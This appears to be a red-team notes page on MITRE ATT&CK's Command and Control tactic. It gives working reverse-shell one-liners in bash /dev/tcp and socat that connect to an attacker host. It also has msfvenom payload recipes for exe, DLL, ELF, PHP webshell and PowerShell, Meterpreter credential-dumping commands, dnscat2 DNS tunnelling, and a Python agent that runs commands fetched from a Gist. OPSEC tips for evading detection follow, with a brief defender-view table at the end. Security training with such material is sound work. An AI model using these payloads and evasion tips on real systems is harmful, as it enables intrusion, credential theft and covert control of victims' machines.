---
type: tactic-hub
room: red
tactic: "Command and Control"
tactic_id: "TA0011"
tags: [red/c2, mitre/TA0011]
date_updated: {{date}}
---

# TA0011 — Command and Control

> [!quote]
> *"I am the last and highest court of appeal in detection."*
> — *The Adventure of the Copper Beeches*

**MITRE Reference:** [TA0011](https://attack.mitre.org/tactics/TA0011/) | **Kill Chain Phase:** C2

The adversary is trying to communicate with compromised systems. An isolated foothold is worthless. C2 is the wire that connects the adversary to every compromised host — the hidden telephone exchange that coordinates the entire operation.

---

## Techniques in This Tactic

| Technique ID | Name | Notes |
|-------------|------|-------|
| [[T1071 - Application Layer Protocol]] | HTTP/S, DNS, SMTP C2 | Most common |
| [[T1095 - Non-Application Layer Protocol]] | Raw TCP/UDP, ICMP C2 | Uncommon |
| [[T1132 - Data Encoding]] | Base64, XOR encoding | Obfuscate payload |
| [[T1001 - Data Obfuscation]] | Steganography in C2 | Advanced |
| [[T1568 - Dynamic Resolution]] | DGA, fast-flux | Evade blocklists |
| [[T1572 - Protocol Tunneling]] | DNS/ICMP tunneling | Bypass egress filters |
| [[T1090 - Proxy]] | Multi-hop, domain fronting | Attribution evasion |
| [[T1102 - Web Service]] | GitHub, Pastebin, Slack C2 | Blend with legit traffic |
| [[T1205 - Traffic Signaling]] | Port knocking | Activate C2 on demand |

---

## The Standard Kit

| Tool | Type | Protocol | Notes |
|------|------|---------|-------|
| `netcat` / `ncat` | Simple listener | Raw TCP | Basic, no encryption |
| `socat` | Advanced relay | TCP/UDP/TLS | Encrypted tunnel |
| Metasploit (meterpreter) | Full C2 | HTTPS | Detection signatures known |
| Sliver | Modern C2 | HTTPS/DNS/MTLS | Open source, active dev |
| Havoc | Modern C2 | HTTPS | Less detected than MSF |
| Villain | C2 framework | HTTPS | Lightweight |
| `dnscat2` | DNS C2 | DNS | Tunnels through DNS |

---

## Standard C2 Workflows

### Netcat — Basic Listener
```bash
# Attacker — start listener
nc -lvnp 4444

# Target — reverse shell
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Upgrade shell immediately after catching
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

### Socat — Encrypted Listener
```bash
# Generate self-signed cert (attacker)
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker — TLS listener
socat -d -d openssl-listen:4444,cert=shell.pem,verify=0,fork STDOUT

# Target — TLS reverse shell
socat openssl-connect:<attacker_ip>:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Metasploit — Meterpreter (HTTPS)
```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o payload.elf

# Start handler
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <attacker_ip>; set LPORT 443; exploit -j"

# Meterpreter — useful commands
getuid; getpid; sysinfo
hashdump                    # dump SAM
getsystem                   # privesc
upload /local/file C:\\Temp\\file
download C:\\Temp\\loot.txt /local/
run post/windows/gather/credentials/credential_collector
portfwd add -l 8080 -p 80 -r <internal_target>
```

### DNS C2 — dnscat2
```bash
# Attacker — start server (needs domain with NS record pointing to you)
ruby dnscat2.rb --dns "domain=<your_domain>,host=<attacker_ip>"

# Target — start client
./dnscat --dns server=<your_domain> --secret <shared_secret>

# Tunnel is entirely DNS — bypasses HTTP proxies
# Commands: window -i 1; exec cmd.exe; upload; download
```

### HTTP C2 over Legitimate Services (T1102)
```python
# Concept: use GitHub Gist / Pastebin for C2 instructions
# Agent polls URL every N seconds, executes returned command
import requests, time, subprocess

C2_URL = "https://gist.githubusercontent.com/user/gist_id/raw"
while True:
    cmd = requests.get(C2_URL).text.strip()
    if cmd:
        out = subprocess.getoutput(cmd)
        # Exfil output via another channel
    time.sleep(60)
```

---

## Payload Generation Quick-Reference
```bash
# Windows x64 HTTPS reverse shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f exe > payload.exe

# Windows DLL (for DLL hijacking)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f dll > payload.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf > payload.elf
chmod +x payload.elf

# PHP webshell payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw > shell.php

# PowerShell one-liner
msfvenom -p cmd/windows/reverse_powershell LHOST=<ip> LPORT=4444
```

---

## OPSEC Considerations

> [!warning] C2 Traffic Is the Biggest Footprint
> - HTTP C2 to a new/rare domain is detected by DNS reputation and proxy category analysis.
> - Meterpreter HTTPS is flagged by its certificate signature — use custom malleable profiles.
> - Regular, clock-like beaconing intervals are a dead giveaway — add jitter.
> - Use domain fronting or cloud CDNs to blend C2 with legitimate CDN traffic.
> - Long-duration C2 sessions require keepalives that create patterns in flow data.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| Reverse shell | Network / Firewall | Outbound to non-standard port |
| Meterpreter HTTPS | Network / Proxy | TLS to new/suspicious domain |
| DNS C2 | DNS logs | High volume NXDOMAINs or long labels |
| Beaconing | Network flow | Regular interval connections same dst |
| Payload download | Proxy logs | Binary downloaded from unusual host |

---

## Related Notes

- [[TA0003 - Persistence]] ← C2 is often how persistence is triggered
- [[TA0010 - Exfiltration]] ← C2 channel is the exfil channel
- [[TA0005 - Defense Evasion]] ← C2 evasion techniques

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
